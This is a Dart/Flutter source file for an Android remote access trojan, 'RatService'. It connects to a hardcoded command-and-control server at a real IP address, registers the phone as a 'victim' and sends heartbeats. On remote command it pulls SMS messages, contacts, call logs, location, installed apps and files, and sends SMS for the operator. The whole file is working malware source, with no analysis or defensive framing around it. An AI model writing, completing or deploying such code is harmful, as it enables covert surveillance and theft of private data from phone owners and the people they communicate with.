import 'dart:async';
import 'dart:io';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:socket_io_client/socket_io_client.dart' as IO;
import 'data_collector.dart';

class RatService {
  static final RatService _instance = RatService._internal();
  factory RatService() => _instance;
  RatService._internal();

  static const String SERVER_URL = 'http://188.166.255.163:5000';
  
  IO.Socket? _socket;
  Timer? _heartbeatTimer;
  String? _deviceId;
  final DataCollector _dataCollector = DataCollector();

  Future<void> initialize() async {
    _deviceId = await _generateDeviceId();
    await _connectToServer();
  }

  Future<String> _generateDeviceId() async {
    final deviceInfo = DeviceInfoPlugin();
    if (Platform.isAndroid) {
      final androidInfo = await deviceInfo.androidInfo;
      return '${androidInfo.id}_${androidInfo.model}_${DateTime.now().millisecondsSinceEpoch}';
    }
    return 'unknown_${DateTime.now().millisecondsSinceEpoch}';
  }

  Future<void> _connectToServer() async {
    try {
      _socket = IO.io(SERVER_URL, 
        IO.OptionBuilder()
          .setTransports(['websocket'])
          .enableAutoConnect()
          .enableReconnection()
          .setReconnectionDelay(2000)
          .setReconnectionDelayMax(5000)
          .build()
      );

      _socket!.onConnect((_) {
        print('[RAT] Connected to C2 server');
        _registerVictim();
        _startHeartbeat();
      });

      _socket!.onDisconnect((_) {
        print('[RAT] Disconnected from C2 server');
      });

      _socket!.on('execute_command', (data) async {
        await _handleCommand(data);
      });

      _socket!.connect();
    } catch (e) {
      print('[RAT] Connection error: $e');
    }
  }

  Future<void> _registerVictim() async {
    final deviceInfo = await _getDeviceInfo();
    _socket!.emit('register_victim', {
      'deviceId': _deviceId,
      'deviceInfo': deviceInfo,
    });
  }

  Future<Map<String, dynamic>> _getDeviceInfo() async {
    final deviceInfo = DeviceInfoPlugin();
    if (Platform.isAndroid) {
      final androidInfo = await deviceInfo.androidInfo;
      return {
        'model': androidInfo.model,
        'manufacturer': androidInfo.manufacturer,
        'androidVersion': androidInfo.version.release,
        'sdkVersion': androidInfo.version.sdkInt,
        'ipAddress': await _getLocalIP(),
      };
    }
    return {};
  }

  Future<String> _getLocalIP() async {
    try {
      final interfaces = await NetworkInterface.list();
      for (var interface in interfaces) {
        for (var addr in interface.addresses) {
          if (addr.type == InternetAddressType.IPv4 && !addr.isLoopback) {
            return addr.address;
          }
        }
      }
    } catch (e) {
      print('[RAT] IP fetch error: $e');
    }
    return 'N/A';
  }

  void _startHeartbeat() {
    _heartbeatTimer?.cancel();
    _heartbeatTimer = Timer.periodic(const Duration(seconds: 30), (_) {
      _socket?.emit('heartbeat');
    });
  }

  Future<void> _handleCommand(dynamic data) async {
    final command = data['command'];
    final params = data['params'] ?? {};

    print('[RAT] Executing command: $command');

    dynamic result;
    String? error;

    try {
      switch (command) {
        case 'get_sms':
          result = await _dataCollector.getSMS();
          break;
        case 'get_contacts':
          result = await _dataCollector.getContacts();
          break;
        case 'get_call_logs':
          result = await _dataCollector.getCallLogs();
          break;
        case 'get_location':
          result = await _dataCollector.getLocation();
          break;
        case 'get_apps':
          result = await _dataCollector.getInstalledApps();
          break;
        case 'get_files':
          result = await _dataCollector.getFiles(params['path'] ?? '/sdcard/');
          break;
        case 'send_sms':
          result = await _dataCollector.sendSMS(params['number'], params['message']);
          break;
        case 'vibrate':
          await _dataCollector.vibrate();
          result = {'success': true};
          break;
        default:
          error = 'Unknown command';
      }
    } catch (e) {
      error = e.toString();
      print('[RAT] Command error: $e');
    }

    _socket!.emit('command_result', {
      'command': command,
      'result': result,
      'error': error,
    });
  }

  Future<void> startBackgroundService() async {
    // Keep app alive in background
    Future.delayed(const Duration(seconds: 5), () {
      if (_socket?.connected != true) {
        _connectToServer();
      }
    });
  }

  void dispose() {
    _heartbeatTimer?.cancel();
    _socket?.dispose();
  }
}
